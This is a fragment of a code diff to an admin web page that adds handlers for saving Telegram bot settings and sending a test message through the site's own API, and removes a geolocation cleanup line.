+$("saveTelegramDemo").addEventListener("click", async () => {
+  const token = $("telegramToken").value.trim();
+  const chatId = $("telegramChatId").value.trim();
+
+  const r = await fetch("/api/admin/settings", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ telegramBotToken: token, telegramChatId: chatId })
+  });
+
+  const d = await r.json();
+  const m = $("telegramDemoMsg");
+
+  if (!r.ok) {
+    m.className = "admin-msg error";
+    m.textContent = d.error || "Save failed";
+    m.style.display = "block";
+    return;
+  }
+
+  $("telegramToken").value = "";
+  m.className = "admin-msg ok";
+  m.textContent = "Telegram settings saved.";
+  m.style.display = "block";
 });
 
-window.addEventListener("beforeunload",()=>{if(watchId!==null)navigator.geolocation.clearWatch(watchId)});
+$("testTelegramBtn").addEventListener("click", async () => {
+  const m = $("telegramDemoMsg");
+  m.style.display = "none";
+
+  try {
+    const r = await fetch("/api/admin/telegram/test", { method: "POST" });
+    const d = await r.json();
+
+    if (!r.ok) throw new Error(d.error || "Test Message Send Failed");
+
+    m.className = "admin-msg ok";
+    m.textContent = "✅ Test Message Sent to Telegram!";
+    m.style.display = "block";
+  } catch (err) {
+    m.className = "admin-msg error";
+    m.textContent = "❌ Test Failed: " + err.message;
+    m.style.display = "block";
+  }
+});
 </script>
+
 </body>
 </html>
